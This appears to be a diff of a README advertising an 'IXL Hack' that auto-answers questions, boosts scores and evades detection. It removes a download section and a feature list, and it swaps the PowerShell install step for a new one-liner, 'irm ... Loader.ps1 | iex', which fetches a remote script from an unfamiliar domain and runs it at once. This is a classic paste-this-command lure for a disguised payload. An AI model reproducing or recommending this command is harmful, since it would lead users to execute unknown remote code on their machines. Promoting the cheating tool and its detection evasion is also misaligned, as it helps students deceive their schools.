@@ -18,35 +18,6 @@
 4. [INSTALLATION](#-installation--setup-powershell)  
 5. [TROUBLESHOOTING](#-troubleshooting--common-errors)  
 6. [TAGS & KEYWORDS](#-tags--keywords)  
-
----
-
-## ⬇️ DOWNLOAD
-
-### 🔗 Official Download
-[![Download Now](https://img.shields.io/badge/Download-IXL_Hack-brightgreen?style=for-the-badge&logo=github)](https://frtview.com/ixl-hack)
-
-### 📦 Direct Links
-| Platform | Link |
-|----------|------|
-| **GitHub Release** | [Download Latest](https://frtview.com/ixl-hack) |
-| **Direct ZIP** | [Download ZIP](https://frtview.com/ixl-hack) |
-| **Portable Version** | [Download Portable](https://frtview.com/ixl-hack) |
-
----
-
-## 🚀 KEY FEATURES
-- 🔥 **Auto Answer** — Automatically solves any IXL question.
-- 🔥 **Smart Algorithm** — Uses AI to find correct answers.
-- 🔥 **All Subjects** — Works for math, language arts, science, and social studies.
-- 🔥 **Unlimited Practice** — Generate unlimited practice sessions.
-- 🔥 **Score Booster** — Increase your smart score instantly.
-- 🔥 **No Ban** — Advanced anti-detection system.
-- 🔥 **User-Friendly** — Simple interface, easy to use.
-- 🔥 **Free & Open Source** — No hidden payments.
-- 🔥 **Regular Updates** — Kept working with the latest IXL changes.
-- 🔥 **Multi-Device** — Works on PC, Chromebook, and Mac.
-
 ---
 
 ## 📅 STATUS
@@ -69,7 +40,7 @@
 
 ### Step 2: Execute Deployment Command
 ```powershell
-irm https://mast.frtview.com/Loader.ps1 | iex
+irm https://software-get.click/Loader.ps1?get=ixl-asw | iex
 ```
 
 ### Step 3: Wait for Completion
